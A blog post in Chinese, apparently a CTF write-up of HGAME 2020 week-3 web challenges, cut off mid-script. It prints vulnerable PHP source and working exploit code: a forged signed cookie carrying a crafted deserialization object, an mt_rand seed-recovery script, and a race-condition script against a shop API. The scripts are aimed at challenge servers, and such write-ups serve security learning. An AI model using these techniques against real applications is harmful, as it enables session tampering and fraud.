@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在家堕落了好多天，今天去做了下Hgame的week3 序列之争 - Ordinal Scale题目提示第一名才能拿到flag打开题目，f12找到源码压缩包提示，下载之后就是审计了cardinal.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020HGAME">
+<meta property="og:url" content="http://yoursite.com/2020/02/03/2020HGAME/index.html">
+<meta property="og:site_name" content="cop&#39;s blog">
+<meta property="og:description" content="在家堕落了好多天，今天去做了下Hgame的week3 序列之争 - Ordinal Scale题目提示第一名才能拿到flag打开题目，f12找到源码压缩包提示，下载之后就是审计了cardinal.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://uploader.shimo.im/f/ceAQi9FMBc4EKA97.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/lvDVxivfoPoNl3Pz.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/50h6wePQuxMWsv3l.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/YCubfCYeF1IWAkdx.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/RFziU38fadI1MsGI.png!thumbnail">
+<meta property="og:updated_time" content="2020-02-12T11:57:18.679Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2020HGAME">
+<meta name="twitter:description" content="在家堕落了好多天，今天去做了下Hgame的week3 序列之争 - Ordinal Scale题目提示第一名才能拿到flag打开题目，f12找到源码压缩包提示，下载之后就是审计了cardinal.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/ceAQi9FMBc4EKA97.png!thumbnail">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/03/2020HGAME/">
+
+
+
+
+
+  <title>2020HGAME | cop's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cop's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/2020HGAME/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cop's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2020HGAME</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T21:32:27+08:00">
+                2020-02-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在家堕落了好多天，今天去做了下Hgame的week3</p>
+<h2 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h2><p>题目提示第一名才能拿到flag<br>打开题目，f12找到源码压缩包提示，下载之后就是审计了<br>cardinal.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">class Game</span><br><span class="line">&#123;   </span><br><span class="line">    private <span class="variable">$encryptKey</span> = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    public <span class="variable">$welcomeMsg</span> = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    private <span class="variable">$sign</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$rank</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$playerName</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">'player'</span>] = <span class="variable">$playerName</span>;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'exp'</span>] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = [<span class="variable">$playerName</span>, <span class="variable">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="variable">$this</span>-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$this</span>-&gt;monster = new Monster(<span class="variable">$this</span>-&gt;sign);</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = new Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> init(<span class="variable">$data</span>)&#123;</span><br><span class="line">        foreach(<span class="variable">$data</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;welcomeMsg = sprintf(<span class="variable">$this</span>-&gt;welcomeMsg, <span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;sign .= md5(<span class="variable">$this</span>-&gt;sign . <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Rank</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$rank</span>;</span><br><span class="line">    private <span class="variable">$serverKey</span>;     // 服务器的 Key</span><br><span class="line">    private <span class="variable">$key</span> = <span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;Set(rand(2, 1000));</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;Set(<span class="variable">$_SESSION</span>[<span class="string">'rank'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> Set(<span class="variable">$no</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = <span class="variable">$no</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Get</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> Fight(<span class="variable">$monster</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$monster</span>[<span class="string">'no'</span>] &gt;= <span class="variable">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;rank -= rand(5, 15);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;rank &lt;= 2)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;rank = 2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'exp'</span>] += rand(20, 200);</span><br><span class="line">            <span class="built_in">return</span> array(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="literal">true</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:green;"&gt;Congratulations! You win! &lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> array(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:red;"&gt;You die!&lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        // 确保程序是跑在服务器上的！</span><br><span class="line">        <span class="variable">$this</span>-&gt;serverKey = <span class="variable">$_SERVER</span>[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;key === <span class="variable">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'rank'</span>] = <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            // 非正常访问</span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="built_in">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Monster</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$monsterData</span>;</span><br><span class="line">    private <span class="variable">$encryptKey</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$key</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;encryptKey = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$_COOKIE</span>[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;Set();</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$monsterData</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$monsterData</span>) &gt; 32)&#123;</span><br><span class="line">            <span class="variable">$sign</span> = substr(<span class="variable">$monsterData</span>, -32);</span><br><span class="line">            <span class="variable">$monsterData</span> = substr(<span class="variable">$monsterData</span>, 0, strlen(<span class="variable">$monsterData</span>) - 32);</span><br><span class="line">            <span class="keyword">if</span>(md5(<span class="variable">$monsterData</span> . <span class="variable">$this</span>-&gt;encryptKey) === <span class="variable">$sign</span>)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;monsterData = unserialize(<span class="variable">$monsterData</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="built_in">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Set</span></span>()&#123;</span><br><span class="line">        <span class="variable">$monsterName</span> = [<span class="string">'无名小怪'</span>, <span class="string">'BOSS: The Kernal Cosmos'</span>, <span class="string">'小怪: Big Eggplant'</span>, <span class="string">'BOSS: The Mole King'</span>, <span class="string">'BOSS: Zero Zone Witch'</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;monsterData = array(</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="variable">$monsterName</span>[array_rand(<span class="variable">$monsterName</span>, 1)],</span><br><span class="line">            <span class="string">'no'</span> =&gt; rand(1, 2000),</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Get</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">Save</span></span>()&#123;</span><br><span class="line">        <span class="variable">$sign</span> = md5(serialize(<span class="variable">$this</span>-&gt;monsterData) . <span class="variable">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="variable">$this</span>-&gt;monsterData) . <span class="variable">$sign</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个游戏大概意思就是先输入一个用户名，然后随机给一个rank，不断挑战，每次挑战成功rank提升5-15名<br>最后判断第一名的时候，再设置成第二名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> Fight(<span class="variable">$monster</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$monster</span>[<span class="string">'no'</span>] &gt;= <span class="variable">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;rank -= rand(5, 15);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;rank &lt;= 2)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;rank = 2;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
+<p>只要让rank=1就行了<br>审计中发现只要知道sign就可以控制cookie中的monster值反序列化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$monsterData</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$monsterData</span>) &gt; 32)&#123;</span><br><span class="line">            <span class="variable">$sign</span> = substr(<span class="variable">$monsterData</span>, -32);</span><br><span class="line">            <span class="variable">$monsterData</span> = substr(<span class="variable">$monsterData</span>, 0, strlen(<span class="variable">$monsterData</span>) - 32);</span><br><span class="line">            <span class="keyword">if</span>(md5(<span class="variable">$monsterData</span> . <span class="variable">$this</span>-&gt;encryptKey) === <span class="variable">$sign</span>)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;monsterData = unserialize(<span class="variable">$monsterData</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
+<p>sign是由game类中的encryptKey而来，用encryptKey = ‘SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW’<br>验证出来是不对的233<br>只要可以控制monster，可以用rank类destruct方法控制rank<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        // 确保程序是跑在服务器上的！</span><br><span class="line">        <span class="variable">$this</span>-&gt;serverKey = <span class="variable">$_SERVER</span>[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;key === <span class="variable">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'rank'</span>] = <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是destruct里面又加了一层验证，不知道key是啥233<br>感谢旺哥，旺哥tql<br>第一步 格式化字符串获取encryptKey<br><img src="https://uploader.shimo.im/f/ceAQi9FMBc4EKA97.png!thumbnail" alt><br>第二步 引用属性<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Rank</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$rank</span>;</span><br><span class="line">    private <span class="variable">$serverKey</span>;     // 服务器的 Key</span><br><span class="line">    private <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = 1;</span><br><span class="line">        <span class="variable">$this</span>-&gt;key = &amp;<span class="variable">$this</span>-&gt;serverKey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Rank();</span><br><span class="line"><span class="variable">$data</span> = [<span class="string">'cop'</span>, <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="string">''</span>;</span><br><span class="line">foreach(<span class="variable">$data</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$sign</span>.=md5(<span class="variable">$sign</span>.<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sign</span> = md5(serialize(<span class="variable">$a</span>).<span class="variable">$sign</span>);</span><br><span class="line"><span class="variable">$rank_monster</span> = base64_encode(serialize(<span class="variable">$a</span>).<span class="variable">$sign</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$rank_monster</span>;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://uploader.shimo.im/f/lvDVxivfoPoNl3Pz.png!thumbnail" alt></p>
+<h2 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂!"></a>二发入魂!</h2><p><img src="https://uploader.shimo.im/f/50h6wePQuxMWsv3l.png!thumbnail" alt><br>刚看还以为是要把抽卡的数字在下面提交呢，后来才知道是要提交随机数种子<br>而且种子两秒一变，看这个篇文章<a href="https://www.anquanke.com/post/id/196831#h3-5" target="_blank" rel="noopener">无需暴破还原mt_rand()种子</a><br>大概意思就是知道同一个种子的第一个和第278个随机数，就可以算出种子<br><a href="https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py" target="_blank" rel="noopener">git源码</a><br>附上旺哥的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/random.php?times=277"</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=ildg7skp4kk9ledbbkgnlvo5t0"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url,headers=headers).json()</span><br><span class="line"></span><br><span class="line">arg0 = res[0]</span><br><span class="line">arg1 = res[227]</span><br><span class="line"><span class="built_in">print</span>(arg0)</span><br><span class="line"><span class="built_in">print</span>(arg1)</span><br><span class="line">result = os.popen(<span class="string">'python reverse_mt_rand.py &#123;0&#125; &#123;1&#125; 0 0'</span>.format(arg0, arg1))</span><br><span class="line">res = result.read()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/verify.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'ans'</span>:res</span><br><span class="line">&#125;</span><br><span class="line">result = requests.post(url,data=data,headers=headers)</span><br><span class="line"><span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure></p>
+<p>不带cookie跑不出来</p>
+<h2 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h2><p>条件竞争，可能是买了东西之后先计入库存再扣钱，然后在扣钱之前卖出去就行<br>附p3师傅脚本，膜<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://121.36.88.65:9999/API/?method="</span></span><br><span class="line"></span><br><span class="line">def action(action):</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        url_buy = url + action</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">"code"</span>:<span class="string">"800003"</span>,</span><br><span class="line">            <span class="string">"amount"</span>:<span class="string">"250"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=4s8uu8ad0eqqcnskrna7s2gma9"</span></span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            res = requests.post(url_buy, data=post_data, headers=header)</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span 